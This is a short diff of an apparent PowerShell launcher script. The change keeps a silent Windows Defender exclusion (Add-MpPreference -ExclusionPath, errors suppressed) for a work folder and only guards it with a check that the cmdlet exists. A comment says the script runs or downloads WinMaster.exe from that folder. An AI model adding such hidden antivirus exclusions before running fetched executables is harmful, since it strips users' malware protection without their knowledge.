@@ -18,7 +18,9 @@ if (-not (Test-Path $workDir)) {
     New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 }
 
-Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+    Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+}
 
 # If WinMaster.exe exists, launch instantly! If -Update or missing, download fresh copy
 if (Test-Path $exePath) {
